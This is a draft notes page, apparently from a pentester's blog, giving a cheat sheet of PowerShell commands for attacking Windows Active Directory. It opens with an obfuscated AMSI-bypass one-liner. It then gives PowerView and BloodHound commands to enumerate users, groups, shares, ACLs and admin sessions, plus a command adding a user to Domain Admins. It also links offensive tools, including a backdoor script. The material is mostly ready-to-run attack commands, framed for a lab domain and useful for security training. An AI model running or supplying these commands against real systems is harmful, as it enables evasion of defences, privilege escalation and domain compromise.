---
title: Windows AD Domain Enumeration
published: 2025-02-11
description: "Commands for enumerating windows AD"
image: "./img/img.jpg"
tags: [Notes ,AD, windows]
category: 'Notes'
draft: true
---

# User Enumeration

## bypass AMSI

```bash
powershell -ep bypass
SET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

## Download powerview
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

```bash
import .\Powerview.ps1
```

## Get a list of users in the current domain
```bash
Get-DomainUser
Get-DomainUser -Name student1
```

## Find User Accounts used as Service Accounts
```bash
Get-DomainUser -SPN
```

## Get list of all properties for users in the current domain
```bash
Get-DomainUser -Properties pwdlastset
Get-DomainUser -Properties badpwdcount
Get-DomainUser -Properties lastlogon
Get-DomainUser -Properties description
Get-DomainUser -Properties samaccountname,description
```

## all enabled users, returning distinguishednames
```bash
Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname
```

## all disabled users
```bash
Get-DomainUser -UACFilter ACCOUNTDISABLE
```

# Domain Group Enumeration

## Get all the groups in the current domain
```bash
Get-DomainGroup
Get-DomainGroupMember -Name "Domain Admins"
Get-DomainGroup -Domain <targetdomain>
Get-DomainGroupMember -Name "Domain Admins" -Recurse
```

## Get all the members of the Domain Admins group
```bash
Get-NetGroupMember -GroupName "Domain Admins"
Get-NetGroupMember  -GroupName "Domain Admins" -Recurse
Get-DomainOU
Get-NetGroupMember -GroupName "Enterprise Admins" -Domain <DOmain name here>
```


## Get the group membership for a user:
```bash
Get-DomainGroup -UserName "student1"
```

# Domain Computer Enumeration
## enumerates computers in the current domain with 'outlier' properties, i.e. properties not set from the forest result returned by Get-DomainComputer

```bash
Get-DomainComputer -FindOne | Find-DomainObjectPropertyOutlier
Get-DomainComputer 
Get-DomainComputer -OperatingSystem "*Server 2016*"
Get-DomainComputer  -Ping
Get-DomainComputer -Name "Student.pentesting.local"
```

# GPO and OU Enumeration

A Group Policy Object (GPO) is a virtual collection of policy settings. A GPO has a unique name, such as a GUID.

```bash
Get-DomainGPO
Get-DomainGPO | Select displayname
Get-DomainGPO -ComputerName student/ad/dc/web.pentesting.local
```

## Get machines where the given user is member of a specific group
```bash
Get-DomainGPOUserLocalGroupMapping -UserName student1 -Verbose
Get-domain
```

## enumerate all gobal catalogs in the forest
```bash
Get-ForestGlobalCatalog
```

## Get OUs in a domain
```bash
Get-DomainOU
```

## Get GPO applied on an OU. Read GPOname from gplink attribute from Get-NetOU
```bash
Get-DomainGPO 
Get-DomainGPO -Name "{AB306569-220D-43FF-B03B83E8F4EF8081}"
```

# File Shares Enumeration
## Find shares on hosts in current domain.
```bash
Find-DomainShare -Verbose
cd \\fileshare.pentesting.local\FileShare
nslookup.exe ad.pentesting.local
```

## Find Non Standard Shares
```bash
Find-DomainShare -Verbose -ExcludeStandard -ExcludeIPC -ExcludePrint
```

## Find sensitive files on computers in the domain
```bash
Invoke-FileFinder -Verbose
```

## Get all fileservers of the domain
```bash
Get-DomainFileServer -Verbose
```

# Intro to ACL

## Get the ACLs associated with the specified object
```bash
Get-ObjectAcl -SamAccountName student1 -ResolveGUIDs
```

## GenericWrite for all users > under advanced > Write all properties
```bash
Get-ObjectAcl -SamAccountName * -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericWrite') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603') }
```

## Add user to domain admin
```bash
net user student1 /domain; 
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'student1' -Domain "pentesting"; 
net user student1 /domain
```

# Active Directory Recon

Github : sens-of-security/ADRecon.ps1

# BloodHound

## Download Bloodhound GUI
https://github.com/BloodHoundAD/BloodHound/releases

## Download Neoj4
https://neo4j.com/download-center/#community

## Download SharpHound
https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
```bash
powershell -ep bypass
import-module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Verbose -Domain pentesting
```

# User Hunting Domain Enumeration

## Find all machines on the current domain where the current user has local admin access
```bash
Test-AdminAccess -Verbose
```

## Tools
- https://raw.githubusercontent.com/admin0987654321/admin1/master/Find-WMILocalAdminAccess.ps1
- `Find-WMILocalAdminAccess.ps1`
- https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemotePSRemoting.ps1
- `FindPSRemotingLocalAdminAccess.ps1`


## Find local admins on all machines of the domain 
### (needs administrator privs on non-dc machines).
```bash
Find-DomainLocalGroupMember -Verbose
```

## Find computers where a domain admin (or specified user/group) has sessions:
```bash
Find-DomainUserLocation
Find-DomainUserLocation -GroupName "RDPUsers"
```

## To confirm admin access
```bash
Invoke-Command -ComputerName dc -ScriptBlock{whoami}
Enter-PSSession -ComputerName dc
Find-DomainUserLocation -CheckAccess
```

## Find computers where a domain admin is logged-in.
```bash
Find-DomainUserLocation -Stealth
```
